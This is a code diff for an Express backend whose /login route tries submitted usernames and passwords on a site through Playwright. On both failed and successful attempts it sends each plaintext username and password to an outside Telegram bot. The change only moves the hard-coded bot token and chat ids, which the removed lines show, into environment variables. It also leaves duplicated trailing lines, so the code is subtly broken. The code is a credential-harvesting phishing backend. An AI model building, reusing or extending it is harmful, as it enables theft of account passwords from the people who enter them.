@@ -2,6 +2,7 @@ const express = require("express");
 const { chromium } = require("playwright");
 const cors = require("cors");
 const fetch = require("node-fetch");
+require("dotenv").config();
 
 const app = express();
 const port = 8080;
@@ -43,10 +44,10 @@ app.post("/login", async (req, res) => {
 
     const loginError = await page.locator(".errors").count();
     if (loginError > 0) {
-      await browser.close(); 
-      const telegramUrl = https://api.telegram.org/bot8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM/sendMessage?chat_id=-1002614062462;
+      await browser.close();
+      const telegramUrl = https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462;
       const telegramMessage = {
-        chat_id: 531918242,
+        chat_id: process.env.CHAT_ID,
         text: ✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password},
       };
 
@@ -64,9 +65,9 @@ app.post("/login", async (req, res) => {
       return res.json({ success: false, message: "Login failed" });
     }
 
-    const telegramUrl = https://api.telegram.org/bot8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM/sendMessage?chat_id=-1002614062462;
+    const telegramUrl = https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462;
     const telegramMessage = {
-      chat_id: 531918242,
+      chat_id: process.env.CHAT_ID,
       text: ✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password},
     };
 
@@ -91,6 +92,10 @@ app.post("/login", async (req, res) => {
 });
 
 app.listen(port, () => {
+  console.log(`Backend server is running at http://localhost:${port}`);
+});
+
+module.exports = app;
   console.log(`Backend server is running at http://localhost:${port}`);
 });
 
